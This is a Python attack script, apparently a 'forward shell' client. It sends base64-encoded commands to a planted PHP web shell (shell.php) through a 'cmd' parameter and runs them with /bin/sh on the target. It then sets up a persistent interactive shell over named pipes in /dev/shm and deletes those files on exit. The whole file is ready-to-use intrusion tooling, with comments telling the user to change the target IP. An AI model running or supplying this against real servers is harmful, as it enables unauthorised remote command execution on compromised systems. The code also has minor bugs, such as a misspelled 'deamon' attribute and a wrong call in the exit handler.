#!/usr/bin/python3

import requests, sys, threading, signal, time, pdb
from base64 import b64encode
from random import randrange


class allTheReads(object):

	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.deamon = True
		thread.start()



	def run(self):
		readOutput = """/bin/cat %s""" % (stdout)
		clearOutput = """echo '' > %s""" % (stdout)

		while True:
			output = runCMD(readOutput)

			if output:
				runCMD(clearOutput)
				print(output)

			time.sleep(self.interval)

def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	runCMD(eraseStdin, eraseStdout)
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

def runCMD(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')

	payload = {
		'cmd' : 'echo "%s" | base64 -d | /bin/sh' % (cmd)
	}
# CHANGE IP
	result = (requests.get('http://192.168.1.47/shell.php', params=payload, timeout=5).text).strip()
	return result

def writeCMD(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')

	payload = {
		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)

	}
# CHANGE IP
	result = (requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text).strip()
	return result

def readCMD():
	getOutPut = """/bin/cat %s""" % (stdout)
	output = runCMD(getOutPut)
	return output

def setUpShell():
	namedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		runCMD(namedPipes)
	except:
		None
	return None


# Variables
global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % session
stdout = "/dev/shm/output.%s" % session

eraseStdin = """/bin/rm %s""" % (stdin)
eraseStdout = """/bin/rm %s""" % (stdout)

setUpShell()
readingTheThings = allTheReads()


while True:
	cmd = input("Lautaro >_ ")
	writeCMD(cmd + "\n")
	time.sleep(1.1)
